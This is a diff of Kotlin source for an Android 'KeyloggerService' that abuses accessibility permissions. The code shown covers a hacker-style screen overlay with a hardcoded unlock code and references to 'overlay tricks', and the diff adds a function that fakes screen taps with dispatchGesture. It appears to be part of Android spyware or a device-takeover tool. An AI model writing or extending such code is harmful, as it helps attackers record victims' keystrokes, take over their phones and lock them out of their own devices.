@@ -26,8 +26,21 @@ class KeyloggerService : AccessibilityService() {
         @Volatile var instance: KeyloggerService? = null
         @Volatile var unlockCode: String = "2719"
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
+        fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
         fun hideScreenInject()   { instance?.hideOverlay() }
         fun resetUnlockCode()    { unlockCode = "2719" }
+    }
+
+    /** Inject tap via AccessibilityService.dispatchGesture (for OverlayTrickManager fallback) */
+    private fun dispatchTap(x: Float, y: Float) {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            try {
+                val path    = android.graphics.Path().apply { moveTo(x, y) }
+                val stroke  = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 50L)
+                val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
+                dispatchGesture(gesture, null, null)
+            } catch (_: Exception) {}
+        }
     }
 
     @Volatile private var overlayView: HackerOverlayView? = null
